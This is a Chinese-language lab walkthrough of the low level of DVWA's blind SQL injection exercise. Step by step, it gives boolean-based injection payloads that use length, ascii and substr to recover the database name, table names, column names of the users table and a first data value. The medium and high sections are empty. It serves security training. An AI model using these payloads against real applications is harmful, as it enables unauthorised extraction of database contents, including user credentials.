# SQL Injection (Blind)

> ## @Date：2021-4-29
>
> ## @Author：Tanyiqu

## low

首先介绍MySQL数据库的几个函数

```
length(str);			获取字符串的长度
ascii(str);				返回str最左面字符的ASCII码值
substr(str,pos);		截取字符串，从pos位置截取到字符串末尾
substr(str,pos,len);	截取字符串，从pos位置开始截取len个字符
```



### 验证是否存在SQL注入

首先输入 `1` ，提示用户存在

首先输入 `10` ，提示用户存在

再输入 `1'` ，提示用户不存在

再输入 `1' and 1=1#`  ，提示用户存在

再输入 `10' and 1=1#`  ，提示用户不存在

可以判断输入存在SQL注入



### 尝试猜测数据库名称

#### 首先猜测数据库长度

依次尝试下面语句

```
1' and length(database())=1 # 提示不存在
1' and length(database())=2 # 提示不存在
1' and length(database())=3 # 提示不存在
1' and length(database())=4 # 提示存在
```

可以得到数据库的长度为4



#### 尝试猜解数据库名

```
1' and ascii(substr(database(),1,1))>97 # 提示用户存在，说明数据库名第一位字符的ASCII值大于97(a)
1' and ascii(substr(database(),1,1))<122 # 提示用户存在，说明数据库名第一位字符的ASCII值小于122(z)
1' and ascii(substr(database(),1,1))<109 # 提示用户存在，说明数据库名第一位字符的ASCII值小于109(m)
....
1' and ascii(substr(database(),1,1))>99 # 提示用户存在，说明数据库名第一位字符的ASCII值大于99(c)
1' and ascii(substr(database(),1,1))<100 # 提示用户不存在，说明数据库名第一位字符的ASCII值不小于100(d)
最后两个条件可以得出，第一位大于c，但不小于d，所以第一位为d

继续验证后面三位
1' and ascii(substr(database(),2,1))>97 # 提示用户存在，说明数据库名第二位字符的ASCII值大于97(a)
...
```

得出数据库名为：dvwa



### 猜解数据库的表

#### 猜解数据库的表的数量

```
1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=1 # 提示不存在

1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 # 提示存在
```

说明数据库中有两张表



#### 依次猜解表的长度

```
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=1 # 提示不存在
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=2 # 提示不存在
...
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))=9 # 提示存在
```

说明第一张表的长度为9

同理

```
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=1 # 提示不存在
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=2 # 提示不存在
...
1' and length((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1))=5 # 提示存在
```

说明第一张表的长度为5



#### 猜解表名

```
# 第一张表
# 第一张表的第一位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>102 # 提示存在 （大于f）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))<103 # 提示不存在 （不小于g）
# 第一张表的第一位为g

# 第一张表的第二位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),2,1))>116 # 提示存在 （大于t）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),2,1))<117 # 提示不存在 （不小于u）
# 第一张表的第二位为u
...
# 得到第一张表的表名为 guestbook

# 第二张表
# 第二张表的第一位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1,1))>116 # 提示存在 （大于t）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1,1))<117 # 提示不存在 （不小于u）
# 第二张表的第一位为u

# 第二张表的第二位
1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),2,1))>114 # 提示存在 （大于r）

1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),2,1))<115 # 提示不存在 （不小于s）
# 第二张表的第二位为s
...
# 得到第二张表的表名为 users
```



#### 猜解表的字段名

猜user表中的字段数量

```
1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 # 显示不存在

1' and (select count(column_name) from information_schema.columns where table_name= 'users')=8 # 显示存在
# user表中的字段为8
```



依次猜解user表的字段

猜解第1个字段的长度

```
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 # 显示不存在
...
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 # 显示存在
# user表的第一个字段长度为7
```

猜解第2个字段的长度

```
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))=1 # 显示不存在
...
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))=10 # 显示存在
# user表的第二个字段长度为10
```



依次猜解user表第一个字段

```同理，得到
# 继续使用二分法猜解字段名
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117 # 显示存在
# user表第一个字段的第1位为u

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1))=115 # 显示存在
# user表第一个字段的第2位为s

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),3,1))=101 # 显示存在
# user表第一个字段的第3位为e

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),4,1))=114 # 显示存在
# user表第一个字段的第4位为r

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),5,1))=95 # 显示存在
# user表第一个字段的第5位为_

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),6,1))=105 # 显示存在
# user表第一个字段的第6位为i

1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),7,1))=100 # 显示存在
# user表第一个字段的第7位为d

# user表第一个字段为 user_id

同理，得到user表中所有字段
user
avatar
failed_login
first_name
last_login
last_name
password
user_id
```



### 猜解数据

同样采用二分法

猜解user_id字段的第一条数据，这里特意使用类型为int的字段，原理都一样，转换成字符串二分法就可以

```
# 先猜数据长度，猜出长度为1
1' and (select length(substr((select user_id from dvwa.users limit 0,1),1)))=1 # 显示存在

# 再逐个猜每一位
1' and (select (substr((select user_id from dvwa.users limit 0,1),1,1)))=1 # 显示存在

# 猜出user_id字段的第一条数据为 1
```



至此，low等级毕！

<br>

## medium



<br>

## high



<br>